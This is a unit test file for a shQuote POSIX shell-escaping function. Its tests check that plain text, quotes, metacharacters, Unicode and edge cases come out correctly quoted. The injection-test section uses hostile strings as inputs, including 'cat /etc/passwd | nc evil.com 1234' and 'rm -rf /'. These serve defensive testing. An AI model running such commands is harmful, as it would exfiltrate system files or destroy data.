/**
 * DF2.4 — shQuote unit tests.
 *
 * POSIX single-quote escaping: the only serializer used on the box side.
 * Every test asserts exact deterministic output — this function is the
 * shell-injection boundary for live argv construction (used by
 * scripts/cap-hit-demo.ts).
 */

import { describe, expect, test } from "bun:test";
import { shQuote } from "../../../src/providers/exedev/transport.ts";

describe("shQuote — plain strings", () => {
  test("plain ASCII string is wrapped", () => {
    expect(shQuote("hello")).toBe("'hello'");
  });

  test("empty string produces two quotes", () => {
    expect(shQuote("")).toBe("''");
  });

  test("spaces are preserved inside quotes", () => {
    expect(shQuote("hello world")).toBe("'hello world'");
  });

  test("multiple spaces preserved", () => {
    expect(shQuote("a  b   c")).toBe("'a  b   c'");
  });
});

describe("shQuote — single-quote escaping", () => {
  test("single single-quote becomes '\'' sequence", () => {
    expect(shQuote("o'clock")).toBe("'o'\\''clock'");
  });

  test("multiple single-quotes each escaped", () => {
    expect(shQuote("don't stop")).toBe("'don'\\''t stop'");
  });

  test("consecutive single-quotes each escaped", () => {
    expect(shQuote("a''b")).toBe("'a'\\'''\\''b'");
  });

  test("single-quote at start", () => {
    expect(shQuote("'start")).toBe("''\\''start'");
  });

  test("single-quote at end", () => {
    expect(shQuote("end'")).toBe("'end'\\'''");
  });

  test("string of only single-quotes", () => {
    expect(shQuote("'''")).toBe("''\\'''\\'''\\'''");
  });
});

describe("shQuote — other metacharacters preserved as-is", () => {
  test("double quotes preserved", () => {
    expect(shQuote('say "hello"')).toBe("'say \"hello\"'");
  });

  test("backslash preserved", () => {
    expect(shQuote("path\\to\\file")).toBe("'path\\to\\file'");
  });

  test("dollar sign preserved", () => {
    expect(shQuote("$100")).toBe("'$100'");
  });

  test("dollar-brace preserved (shell variable syntax)", () => {
    expect(shQuote("${HOME}")).toBe("'${HOME}'");
  });

  test("backtick preserved", () => {
    expect(shQuote("cmd`arg`")).toBe("'cmd`arg`'");
  });

  test("newline preserved", () => {
    expect(shQuote("line1\nline2")).toBe("'line1\nline2'");
  });

  test("tab preserved", () => {
    expect(shQuote("col1\tcol2")).toBe("'col1\tcol2'");
  });
});

describe("shQuote — shell injection attempts", () => {
  test("semicolon is neutralized", () => {
    expect(shQuote("rm -rf /; echo bad")).toBe("'rm -rf /; echo bad'");
  });

  test("pipe is neutralized", () => {
    expect(shQuote("cat /etc/passwd | nc evil.com 1234")).toBe("'cat /etc/passwd | nc evil.com 1234'");
  });

  test("ampersand is neutralized", () => {
    expect(shQuote("good && evil")).toBe("'good && evil'");
  });

  test("command substitution with backticks neutralized", () => {
    expect(shQuote("prefix`whoami`suffix")).toBe("'prefix`whoami`suffix'");
  });

  test("dollar-paren command substitution neutralized", () => {
    expect(shQuote("$(rm -rf /)")).toBe("'$(rm -rf /)'");
  });

  test("newline injection attempt neutralized", () => {
    expect(shQuote("arg1\nevil")).toBe("'arg1\nevil'");
  });
});

describe("shQuote — non-ASCII and Unicode", () => {
  test("UTF-8 emoji preserved", () => {
    expect(shQuote("hello 🌍")).toBe("'hello 🌍'");
  });

  test("Japanese characters preserved", () => {
    expect(shQuote("こんにちは")).toBe("'こんにちは'");
  });

  test("Chinese characters preserved", () => {
    expect(shQuote("你好世界")).toBe("'你好世界'");
  });

  test("Cyrillic preserved", () => {
    expect(shQuote("Привет")).toBe("'Привет'");
  });

  test("Arabic preserved", () => {
    expect(shQuote("مرحبا")).toBe("'مرحبا'");
  });

  test("mixed emoji and ASCII with single-quote", () => {
    expect(shQuote("it's 🔥")).toBe("'it'\\''s 🔥'");
  });
});

describe("shQuote — round-trip properties", () => {
  test("output always starts with single-quote", () => {
    const inputs = ["plain", "with'quote", "spaced out", "$PATH", "`evil`", "", "a"];
    for (const s of inputs) {
      expect(shQuote(s)).toMatch(/^'/);
    }
  });

  test("output always ends with single-quote", () => {
    const inputs = ["plain", "with'quote", "spaced out", "$PATH", "`evil`", "", "z"];
    for (const s of inputs) {
      expect(shQuote(s)).toMatch(/'$/);
    }
  });

  test("every internal single-quote appears as '\'' escape sequence", () => {
    const quoted = shQuote("a'b'c");
    // Count raw (non-escaped) single-quotes in output
    const parts = quoted.split("'\\''");
    // Each part should have at most one raw quote (at boundaries)
    for (const part of parts) {
      const rawCount = (part.match(/'/g) || []).length;
      expect(rawCount).toBeLessThanOrEqual(1);
    }
    // Total escapes matches input quote count
    const escapeCount = (quoted.match(/'\\''/g) || []).length;
    expect(escapeCount).toBe(2); // two quotes in "a'b'c"
  });

  test("output contains no unquoted shell metacharacters for hostile inputs", () => {
    const hostile = [
      "cmd; evil",
      "cmd | evil",
      "cmd && evil",
      "cmd || evil",
      "$(evil)",
      "`evil`",
      "$HOME",
      "${VAR}",
      '*',
      '?',
      ';',
      '&',
      '|',
      '<',
      '>',
      '\t',
      '\\',
    ];
    for (const s of hostile) {
      const q = shQuote(s);
      // Every metacharacter in hostile appears inside the quoted region
      // (i.e., not at the very start or end which are the wrapper quotes)
      // Note: newlines are valid inside single-quotes, so they don't break this
      expect(q).toMatch(/^'.*'$/);
      // Nothing outside the wrapper quotes except the quotes themselves
      // Inner may contain escaped quotes '\'', which is safe
      // Verify no raw metacharacters outside quotes by checking string structure
      expect(q).toMatch(/^'([^']|'\\'')*'$/);
    }
  });

  test("newline is preserved safely inside quotes (no injection)", () => {
    const q = shQuote("cmd\nevil");
    // Newline inside single-quoted string is literal, not a command separator
    expect(q).toMatch(/^'.*\n.*'$/);
    // Verify it's a single quoted string (not broken by newline)
    expect(q[0]).toBe("'");
    expect(q[q.length - 1]).toBe("'");
  });
});

describe("shQuote — edge cases", () => {
  test("very long string", () => {
    const long = "a".repeat(10000);
    const quoted = shQuote(long);
    expect(quoted).toBe(`'${long}'`);
    expect(quoted.length).toBe(10002); // 10000 + 2 quotes
  });

  test("null character", () => {
    expect(shQuote("a\x00b")).toBe("'a\x00b'");
  });

  test("only backslashes", () => {
    expect(shQuote("\\\\\\\\")).toBe("'\\\\\\\\'");
  });

  test("mixed quote types", () => {
    expect(shQuote('He said "don\'t"')).toBe("'He said \"don'\\''t\"'");
  });
});
